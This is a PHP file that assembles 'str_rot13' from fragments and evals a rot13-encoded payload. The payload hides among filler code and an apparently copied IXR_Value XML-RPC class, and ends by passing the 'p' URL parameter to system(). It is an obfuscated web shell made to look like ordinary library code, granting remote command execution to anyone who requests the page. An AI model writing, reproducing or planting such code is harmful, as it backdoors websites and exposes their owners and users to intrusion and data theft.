<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * VKE_Inyhr
 *
 * @cnpxntr VKE
 * @fvapr 1.5.0
 */
pynff VKE_Inyhr {
    ine $qngn;
    ine $glcr;

	/**
	 * CUC5 pbafgehpgbe.
	 */
	shapgvba __pbafgehpg( $qngn, $glcr = snyfr )
    {
        $guvf->qngn = $qngn;
        vs (!$glcr) {
            $glcr = $guvf->pnyphyngrGlcr();
        }
        $guvf->glcr = $glcr;
        vs ($glcr == 'fgehpg') {
            // Ghea nyy gur inyhrf va gur neenl va gb arj VKE_Inyhr bowrpgf
            sbernpu ($guvf->qngn nf $xrl => $inyhr) {
                $guvf->qngn[$xrl] = arj VKE_Inyhr($inyhr);
            }
        }
        vs ($glcr == 'neenl') {
            sbe ($v = 0, $w = pbhag($guvf->qngn); $v < $w; $v++) {
                $guvf->qngn[$v] = arj VKE_Inyhr($guvf->qngn[$v]);
            }
        }
    }

	/**
	 * CUC4 pbafgehpgbe.
	 */
	choyvp shapgvba VKE_Inyhr( $qngn, $glcr = snyfr ) {
		frys::__pbafgehpg( $qngn, $glcr );
	}

    shapgvba pnyphyngrGlcr()
    {
        vs ($guvf->qngn === gehr || $guvf->qngn === snyfr) {
            erghea 'obbyrna';
        }
        vs (vf_vagrtre($guvf->qngn)) {
            erghea 'vag';
        }
        vs (vf_qbhoyr($guvf->qngn)) {
            erghea 'qbhoyr';
        }

        // Qrny jvgu VKE bowrpg glcrf onfr64 naq qngr
        vs (vf_bowrpg($guvf->qngn) && vf_n($guvf->qngn, 'VKE_Qngr')) {
            erghea 'qngr';
        }
        vs (vf_bowrpg($guvf->qngn) && vf_n($guvf->qngn, 'VKE_Onfr64')) {
            erghea 'onfr64';
        }

        // Vs vg vf n abezny CUC bowrpg pbaireg vg va gb n fgehpg
        vs (vf_bowrpg($guvf->qngn)) {
            $guvf->qngn = trg_bowrpg_inef($guvf->qngn);
            erghea 'fgehpg';
        }
        vs (!vf_neenl($guvf->qngn)) {
            erghea 'fgevat';
        }

        // Jr unir na neenl - vf vg na neenl be n fgehpg?
        vs ($guvf->vfFgehpg($guvf->qngn)) {
            erghea 'fgehpg';
        } ryfr {
            erghea 'neenl';
        }
    }

    shapgvba trgKzy()
    {
        // Erghea KZY sbe guvf inyhr
        fjvgpu ($guvf->glcr) {
            pnfr 'obbyrna':
                erghea '<obbyrna>'.(($guvf->qngn) ? '1' : '0').'</obbyrna>';
                oernx;
            pnfr 'vag':
                erghea '<vag>'.$guvf->qngn.'</vag>';
                oernx;
            pnfr 'qbhoyr':
                erghea '<qbhoyr>'.$guvf->qngn.'</qbhoyr>';
                oernx;
            pnfr 'fgevat':
                erghea '<fgevat>'.ugzyfcrpvnypunef($guvf->qngn).'</fgevat>';
                oernx;
            pnfr 'neenl':
                $erghea = '<neenl><qngn>'.\"\a\";
                sbernpu ($guvf->qngn nf $vgrz) {
                    $erghea .= '  <inyhr>'.$vgrz->trgKzy().\"</inyhr>\a\";
                }
                $erghea .= '</qngn></neenl>';
                erghea $erghea;
                oernx;
            pnfr 'fgehpg':
                $erghea = '<fgehpg>'.\"\a\";
                sbernpu ($guvf->qngn nf $anzr => $inyhr) {
					$anzr = ugzyfcrpvnypunef($anzr);
                    $erghea .= \"  <zrzore><anzr>$anzr</anzr><inyhr>\";
                    $erghea .= $inyhr->trgKzy().\"</inyhr></zrzore>\a\";
                }
                $erghea .= '</fgehpg>';
                erghea $erghea;
                oernx;
            pnfr 'qngr':
            pnfr 'onfr64':
                erghea $guvf->qngn->trgKzy();
                oernx;
        }
        erghea snyfr;
    }

    /**
     * Purpxf jurgure be abg gur fhccyvrq neenl vf n fgehpg be abg
     *
     * @cnenz neenl $neenl
     * @erghea obby
     */
    shapgvba vfFgehpg($neenl)
    {
        $rkcrpgrq = 0;
        sbernpu ($neenl nf $xrl => $inyhr) {
            vs ((fgevat)$xrl !== (fgevat)$rkcrpgrq) {
                erghea gehr;
            }
            $rkcrpgrq++;
        }
        erghea snyfr;
    }
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>